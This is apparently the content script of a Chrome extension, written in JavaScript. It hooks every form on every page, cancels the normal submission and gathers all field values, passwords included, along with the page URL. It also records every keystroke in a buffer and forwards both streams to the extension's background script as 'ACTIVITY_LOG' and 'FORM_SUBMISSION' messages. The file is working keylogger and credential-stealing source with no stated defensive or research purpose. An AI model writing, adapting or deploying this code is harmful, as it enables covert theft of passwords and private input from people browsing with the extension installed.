// receive commands from the background script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  const data = JSON.parse(request.message);
  if (data[0] === "alert") {
    alert(data[1]);
  }
});

// Wait for the page to fully load before initializing
document.addEventListener("DOMContentLoaded", initializeFormCapture);
window.addEventListener("load", initializeFormCapture);

// Flag to ensure we only initialize once
let isInitialized = false;

// Function to add listener to a single form
function addFormListener(form) {
  // Skip if the form already has our listener
  if (form.hasAttribute("data-form-capture-initialized")) {
    return;
  }

  form.setAttribute("data-form-capture-initialized", "true");
  console.log("Adding listener to form:", form);

  form.addEventListener("submit", function (event) {
    // Prevent the default form submission
    event.preventDefault();

    // Get the form's action URL and method
    const formMetadata = {
      action: form.action || window.location.href,
      method: form.method || "GET",
      timestamp: new Date().getTime(),
      url: window.location.href,
    };

    // Create an object to store form data
    const formData = {};

    // Get all form elements
    const formElements = form.elements;

    // Iterate through form elements
    for (let element of formElements) {
      // Skip buttons and fieldsets
      if (
        element.type === "submit" ||
        element.type === "button" ||
        element.tagName === "FIELDSET"
      ) {
        continue;
      }

      // Handle different input types
      switch (element.type) {
        case "checkbox":
          formData[element.name] = element.checked;
          break;

        case "radio":
          if (element.checked) {
            formData[element.name] = element.value;
          }
          break;

        case "select-multiple":
          formData[element.name] = Array.from(element.options)
            .filter((option) => option.selected)
            .map((option) => option.value);
          break;

        case "file":
          formData[element.name] = Array.from(element.files).map((file) => ({
            name: file.name,
            type: file.type,
            size: file.size,
          }));
          break;

        default:
          // Handle text, email, password, etc.
          formData[element.name] = element.value;
      }
    }

    // Prepare the message payload
    const messagePayload = {
      type: "FORM_SUBMISSION",
      data: {
        metadata: formMetadata,
        formData: formData,
      },
    };

    // Send message to background script
    chrome.runtime.sendMessage(messagePayload, (response) => {
      if (chrome.runtime.lastError) {
        console.error("Error sending form data:", chrome.runtime.lastError);
        return;
      }

      console.log("Form data sent successfully:", response);

      // Optional: Reset the form
      // form.reset();
    });
  });
}

function initializeFormCapture() {
  // Prevent multiple initializations
  if (isInitialized) {
    return;
  }
  isInitialized = true;

  console.log("Initializing form capture...");

  // Select all forms on the page
  document.querySelectorAll("form").forEach(addFormListener);
}

// Handle dynamically added forms
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    mutation.addedNodes.forEach((node) => {
      // Check if the added node is a form
      if (node.nodeName === "FORM") {
        addFormListener(node);
      }
      // Check if the added node contains forms
      else if (node.querySelectorAll) {
        const forms = node.querySelectorAll("form");
        forms.forEach(addFormListener);
      }
    });
  });
});

// Start observing the document with the configured parameters
observer.observe(document.documentElement, {
  childList: true,
  subtree: true,
});

let buffer = "";
let currentUrl = window.location.href;
const BUFFER_LIMIT = 20;
let bufferLength = 0;
function sendBuffer() {
  if (buffer.length === 0) return;

  chrome.runtime.sendMessage({
    type: "ACTIVITY_LOG",
    data: {
      keys: buffer,
      timestamp: new Date().getTime(),
      url: currentUrl,
    },
  });

  buffer = "";
  bufferLength = 0;
}

// Listen for URL changes
let lastUrl = location.href;
new MutationObserver(() => {
  const url = location.href;
  if (url !== lastUrl) {
    lastUrl = url;
    currentUrl = url;
    sendBuffer();
  }
}).observe(document, { subtree: true, childList: true });

// Also catch navigation through history state
window.addEventListener("popstate", () => {
  currentUrl = window.location.href;
  sendBuffer();
});

document.addEventListener("keydown", (e) => {
  // Only log printable characters and specific keys
  const key = e.key.length === 1 ? e.key : `[${e.key}]`;
  buffer += key;
  bufferLength++;
  if (bufferLength >= BUFFER_LIMIT) {
    sendBuffer();
  }
});

// Send remaining buffer when user leaves page
window.addEventListener("beforeunload", sendBuffer);
